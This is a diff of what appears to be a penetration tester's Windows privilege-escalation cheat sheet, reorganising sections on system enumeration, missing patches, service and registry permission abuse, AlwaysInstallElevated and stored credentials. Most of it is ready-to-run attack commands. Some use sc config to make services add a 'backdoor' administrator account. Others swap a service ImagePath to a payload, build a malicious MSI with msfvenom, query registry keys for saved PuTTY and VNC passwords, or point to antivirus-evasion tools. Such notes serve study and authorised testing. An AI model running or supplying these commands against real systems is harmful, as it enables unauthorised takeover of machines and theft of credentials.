@@ -1,4 +1,5 @@
-# Information Gathering
+### INFORMATION GATHERING
+
  What system are we connected to? 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 --> Get the hostname and username (if available) 
@@ -33,7 +34,9 @@ https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exp
 python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt 
 --> Run windows-privesc script 
 https://github.com/pentestmonkey/windows-privesc-check
-# WMIC
+
+### WMIC
+
 Windows Management Instrumentation Command Line 
 Windows XP requires admin 
 --> Use wmic_info.bat script for automation 
@@ -54,7 +57,93 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682"
 Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass)) 
 wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"
 
-# Stored Credentials
+
+Find writeable files
+dir /a-r-d /s /b
+/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
+/s means recurse subdirectories
+/b means bare format. Path and filename only.
+
+
+
+
+
+
+#######################
+# Vulnerable Services #
+#######################
+
+# TOOLS
+- icacls
+DACL for files and folders
+
+- accesschk.exe
+DACL for registry keys, files, processes, users and groups, and services
+For Windows XP, version 5.2 is needed: https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
+Useful feature: it returns objects to which a particular user or group may have write access
+
+accesschk.exe -uwcqv "User" * 
+accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services
+
+# UNQUOTED SERVICE PATHS
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+icacls "C:\Program Files (x86)\Program Folder" 
+sc qc Service1
+
+
+# INSECURE SERVICE PERMISSIONS
+Search for services that have a binary path (binpath) property which can be modified by non-Admin users.
+*Windows XP shipped with several vulnerable built-in services. 
+
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
+accesschk.exe -qdws Users C:\Windows\ 
+
+sc qc Service1
+
+Change the binpath to our binary and restart the service: 
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
+sc stop <vuln-service>
+sc start <vuln-service>
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
+sc stop <vuln-service>
+sc start <vuln-service>
+
+Note - Might need to use the depend attribute explicitly: 
+sc stop <vuln-service>
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+sc start <vuln-service>
+
+# INSECURE REGISTRY PERMISSIONS
+
+accesschk.exe -quvcw *		      	-->  DACLs of every service
+accesschk.exe -quvcw Service1 	-->	 DACLs of one service
+
+Change the Imagepath to our binary. It needs to restart the computer
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
+
+
+# AlwaysInstallElevated
+AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. 
+Check if these 2 registry values are set to “1”: 
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+If they are, create your own malicious msi: 
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+Then use msiexec on victim to execute your msi: 
+msiexec /quiet /qn /i C:\evil.msi
+
+
+
+
+# Bypassing AV
+Use Veil-Evasion
+Create your own executable by “compiling” PowerShell scripts
+Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.
+
+
+### STORED CREDENTIALS
 Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.
 C:\sysprep.inf
 C:\sysprep\sysprep.xml
@@ -107,60 +196,7 @@ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
-Find writeable files
-dir /a-r-d /s /b
-/a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
-/s means recurse subdirectories
-/b means bare format. Path and filename only.
 
-# Trusted Service Paths
-wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
-icacls "C:\Program Files (x86)\Program Folder" 
-
-
-# Vulnerable Services
-Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own. 
-Note: Windows XP shipped with several vulnerable built-in services. 
-Use accesschk from SysInternals to search for these vulnerable services. 
-https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx
-
-For Windows XP, version 5.2 of accesschk is needed: 
-https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
-accesschk.exe -qdws Users C:\Windows\ 
-
-Then query the service using Windows sc: 
-sc qc <vulnerable service name>
-
-Then change the binpath to execute your own commands (restart of the service will most likely be needed): 
-sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
-sc stop <vuln-service>
-sc start <vuln-service>
-sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
-sc stop <vuln-service>
-sc start <vuln-service>
-
-Note - Might need to use the depend attribute explicitly: 
-sc stop <vuln-service>
-sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
-sc start <vuln-service>
-
-# AlwaysInstallElevated
-AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. 
-Check if these 2 registry values are set to “1”: 
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-If they are, create your own malicious msi: 
-msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
-Then use msiexec on victim to execute your msi: 
-msiexec /quiet /qn /i C:\evil.msi
-
-# Bypassing AV
-Use Veil-Evasion
-Create your own executable by “compiling” PowerShell scripts
-Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.
 
 # Getting GUI
 --> Using meterpreter, inject vnc session: 
